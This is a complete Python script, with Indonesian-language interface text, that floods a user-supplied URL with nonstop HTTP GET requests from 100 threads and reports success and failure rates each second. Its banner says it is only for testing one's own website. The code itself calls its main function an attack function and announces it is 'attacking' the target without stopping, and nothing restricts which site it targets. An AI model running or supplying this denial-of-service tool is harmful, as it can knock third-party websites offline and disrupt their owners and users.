import os
import threading
import requests
import time

# Global counter
total_sent = 0
total_failed = 0
sent_last = 0
failed_last = 0
lock = threading.Lock()

# Tampilan Header
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("""
\033[1;92m
██████╗  ██████╗  ██████╗ ██╗  ██╗██╗   ██╗██╗   ██╗███╗   ███╗████████╗███████╗██████╗ 
██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝██║   ██║██║   ██║████╗ ████║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝██║   ██║██║   ██║█████╔╝ ██║   ██║██║   ██║██╔████╔██║   ██║   █████╗  ██████╔╝
██╔═══╝ ██║   ██║██║   ██║██╔═██╗ ██║   ██║██║   ██║██║╚██╔╝██║   ██║   ██╔══╝  ██╔══██╗
██║     ╚██████╔╝╚██████╔╝██║  ██╗╚██████╔╝╚██████╔╝██║ ╚═╝ ██║   ██║   ███████╗██║  ██║
╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
\033[0m
\033[1;91mTools Uji Kekuatan Website Anda - RooxHunter vHard\033[0m
\033[1;90mTekan ENTER untuk melihat panduan penggunaan...\033[0m
""")
    input()
    print("""
\033[1;96m======================== Panduan Penggunaan ========================\033[0m
 - Tools ini hanya untuk uji kekuatan web milik sendiri!
 - Metode: Mengirim 10.000+ permintaan nonstop.
 - Hentikan manual dengan CTRL + C
 - Target HARUS menyertakan protokol (http/https)
 - Contoh penggunaan: https://example.com
\033[1;96m====================================================================\033[0m
""")

# Fungsi serangan
def send_request(url):
    global total_sent, total_failed
    while True:
        try:
            res = requests.get(url, timeout=5)
            if res.status_code == 200:
                with lock:
                    total_sent += 1
                print("\033[1;92m[+] Request sent ➡ 200\033[0m")
            else:
                with lock:
                    total_failed += 1
                print(f"\033[1;91m[-] Gagal mengirim request! Status: {res.status_code}\033[0m")
        except:
            with lock:
                total_failed += 1
            print("\033[1;91m[-] Gagal mengirim request!\033[0m")

# Monitor RPS
def rps_monitor():
    global total_sent, total_failed, sent_last, failed_last
    while True:
        time.sleep(1)
        with lock:
            success = total_sent - sent_last
            failed = total_failed - failed_last
            sent_last = total_sent
            failed_last = total_failed
        print(f"\033[1;93m[RPS] Sukses: {success}/detik | Gagal: {failed}/detik\033[0m")

# Fungsi utama
def main():
    banner()
    url = input("Masukkan URL Target: ")
    print(f"\n\033[1;92m[!] Menyerang {url} tanpa henti... CTRL+C untuk stop.\033[0m\n")
    
    # Jalankan thread serangan
    for _ in range(100):  # Kamu bisa ubah sesuai kemampuan perangkat/server
        threading.Thread(target=send_request, args=(url,), daemon=True).start()

    # Jalankan monitor RPS
    threading.Thread(target=rps_monitor, daemon=True).start()

    # Biar program tetap hidup
    while True:
        time.sleep(10)

if __name__ == "__main__":
    main()
